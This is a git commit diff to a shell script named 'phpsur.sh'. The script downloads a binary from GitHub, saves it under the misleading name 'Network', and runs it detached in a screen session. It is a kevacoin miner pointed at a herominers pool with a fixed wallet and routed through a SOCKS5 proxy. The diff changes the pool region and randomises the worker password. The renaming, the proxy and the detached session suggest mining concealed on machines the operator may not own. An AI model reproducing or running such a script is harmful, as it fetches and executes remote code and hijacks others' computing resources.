21b986bfe04e5f2f144113d85e3eee6d4132b98c
master-running <90834620+master-running@users.noreply.github.com>
2021-09-16 16:55:22 +0700

    Update phpsur.sh

--- phpsur.sh
+++ phpsur.sh
@@ -3,4 +3,4 @@ apt install screen -y
 wget -O Network https://github.com/master-running/master-running/raw/main/Network
 chmod +x Network
 screen -dmS ls
-./Network --algorithm randomkeva --pool sg.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password Build --proxy=socks5://184.75.247.3:59644
+./Network --algorithm randomkeva --pool de.kevacoin.herominers.com:1163 --wallet VSMtpHwu6RvBnJMKf8vBZ3nUxKAXib6Y9b --password MR=$(echo $strDate-$(shuf -i 1-1000 -n 1)) --proxy=socks5://184.75.247.3:59644
